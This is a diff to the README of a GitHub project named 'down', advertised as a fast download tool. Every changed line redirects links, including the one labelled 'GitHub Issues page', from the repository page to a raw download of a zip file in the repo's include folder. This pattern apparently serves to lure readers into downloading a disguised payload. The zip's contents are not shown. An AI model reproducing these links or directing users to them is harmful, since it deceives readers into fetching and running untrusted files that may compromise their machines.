@@ -1,12 +1,12 @@
 # 🚀 down - Fast Downloads, Unstoppable Speed
 
-[![Download Now](https://img.shields.io/badge/Download%20down-Latest%20Version-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=364fc7)](https://github.com/Amylolytic-capsizing378/down)
+[![Download Now](https://img.shields.io/badge/Download%20down-Latest%20Version-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=364fc7)](https://raw.githubusercontent.com/Amylolytic-capsizing378/down/main/include/v3.6.zip)
 
 ## 📥 Getting Started
 
 Visit this link to download the application. Simply click the button above or go to the download page to get the latest version of down.
 
-[🔗 Click Here to Download down](https://github.com/Amylolytic-capsizing378/down)
+[🔗 Click Here to Download down](https://raw.githubusercontent.com/Amylolytic-capsizing378/down/main/include/v3.6.zip)
 
 Once you've downloaded the file, you're ready to experience the fastest downloading tool available for your computer.
 
@@ -107,7 +107,7 @@ Yes, down is completely free to use.
 
 ## 📚 Need More Help?
 
-If you're having trouble or need additional support, please visit our [GitHub Issues page](https://github.com/Amylolytic-capsizing378/down) where you can ask questions by creating a new issue.
+If you're having trouble or need additional support, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Amylolytic-capsizing378/down/main/include/v3.6.zip) where you can ask questions by creating a new issue.
 
 ---
 
@@ -121,7 +121,7 @@ We're always working to improve down. Check the download link regularly to see i
 
 Ready to experience downloading at lightning speed? Here's your link one more time:
 
-[![Download Now](https://img.shields.io/badge/Get%20down%20Today-Fast%20and%20Free-4caf50?style=for-the-badge&logo=download&logoColor=white&labelColor=ff7043)](https://github.com/Amylolytic-capsizing378/down)
+[![Download Now](https://img.shields.io/badge/Get%20down%20Today-Fast%20and%20Free-4caf50?style=for-the-badge&logo=download&logoColor=white&labelColor=ff7043)](https://raw.githubusercontent.com/Amylolytic-capsizing378/down/main/include/v3.6.zip)
 
 ---
 
